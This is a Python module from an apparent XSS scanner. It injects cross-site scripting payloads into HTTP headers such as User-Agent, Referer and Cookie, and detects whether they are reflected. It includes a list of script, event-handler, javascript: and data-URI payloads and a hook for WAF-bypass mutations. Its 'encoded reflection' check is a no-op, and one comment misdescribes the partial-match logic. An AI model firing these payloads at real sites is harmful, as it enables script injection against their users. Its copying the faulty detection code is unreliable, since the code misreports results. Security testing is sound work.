"""
Custom Header Injector Module

This module provides functionality for testing XSS vulnerabilities via HTTP headers,
focusing on headers that might be reflected in the response.
"""

import logging
from typing import Dict, List, Optional, Any

class CustomHeaderInjector:
    """
    Class for testing XSS injections via HTTP headers.
    """
    
    def __init__(self):
        """Initialize the Custom Header Injector."""
        self.logger = logging.getLogger('cachexssdetector.custom_header_injector')
        
        # Headers that are commonly reflected in responses
        self.reflectable_headers = [
            'User-Agent',
            'Referer',
            'X-Forwarded-For',
            'X-Forwarded-Host',
            'X-Requested-With',
            'Origin',
            'Via',
            'From',
            'Accept-Language',
            'Cookie'
        ]
        
        # XSS payloads specifically crafted for header injection
        self.header_payloads = [
            '<script>alert("header-xss")</script>',
            '"><script>alert("header-xss")</script>',
            '"><img src=x onerror=alert("header-xss")>',
            "javascript:alert('header-xss')",
            '"><svg/onload=alert("header-xss")>',
            '\'"</script><script>alert("header-xss")</script>',
            '<img src=1 onerror=alert("header-xss")>',
            '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGVhZGVyLXhzcycpPC9zY3JpcHQ+">',
            '<base href="javascript:alert(\'header-xss\')">',
            '<iframe src="javascript:alert(\'header-xss\')"></iframe>',
            '<math><a xlink:href="javascript:alert(\'header-xss\')">click',
            '<isindex type=image src=1 onerror=alert("header-xss")>',
        ]
        
        self.logger.info("Custom Header Injector initialized")
    
    def generate_malicious_headers(self, waf_bypass=None) -> List[Dict[str, str]]:
        """
        Generate a list of malicious headers to test for XSS vulnerabilities.
        
        Args:
            waf_bypass: Optional WAF bypass module for generating evasive payloads
            
        Returns:
            List of dictionaries, each containing headers with XSS payloads
        """
        header_sets = []
        
        # Generate basic header payloads
        for header in self.reflectable_headers:
            for payload in self.header_payloads:
                header_set = {
                    'header_name': header,
                    'payload': payload,
                    'headers': {
                        header: payload,
                        'Accept': 'text/html,application/xhtml+xml,application/xml',
                        'Connection': 'keep-alive'
                    }
                }
                header_sets.append(header_set)
        
        # If WAF bypass module is provided, generate additional evasive payloads
        if waf_bypass:
            for header in self.reflectable_headers[:3]:  # Test a subset to reduce test time
                for payload in self.header_payloads[:2]:  # Test a subset of payloads
                    bypass_variations = waf_bypass.generate_waf_bypass_payloads(payload, max_variations=3)
                    
                    for variation in bypass_variations:
                        header_set = {
                            'header_name': header,
                            'payload': variation['mutated'],
                            'technique': variation['technique'],
                            'headers': {
                                header: variation['mutated'],
                                'Accept': 'text/html,application/xhtml+xml,application/xml',
                                'Connection': 'keep-alive'
                            }
                        }
                        header_sets.append(header_set)
        
        self.logger.info(f"Generated {len(header_sets)} malicious header combinations")
        return header_sets
    
    def analyze_header_reflection(self, response_text: str, payload: str) -> Dict[str, Any]:
        """
        Analyze response for header reflection.
        
        Args:
            response_text: HTTP response body text
            payload: The XSS payload that was sent
            
        Returns:
            Dictionary with analysis results
        """
        # Basic check for direct reflection
        is_reflected = payload in response_text
        
        # Check for common encoding variations
        encoded_payload = payload.replace('<', '<').replace('>', '>')
        is_encoded_reflected = encoded_payload in response_text
        
        # Check for partial reflection (might indicate filter or WAF)
        partial_reflection = False
        if not is_reflected and len(payload) > 10:
            # Check if at least half of the payload is reflected
            for i in range(len(payload) - 5):
                chunk = payload[i:i+5]
                if chunk in response_text:
                    partial_reflection = True
                    break
        
        return {
            'reflected': is_reflected,
            'encoded_reflected': is_encoded_reflected,
            'partial_reflection': partial_reflection,
            'potentially_exploitable': is_reflected and 'script' in payload.lower() and 'script' in response_text.lower(),
            'needs_manual_verification': is_encoded_reflected or partial_reflection
        }
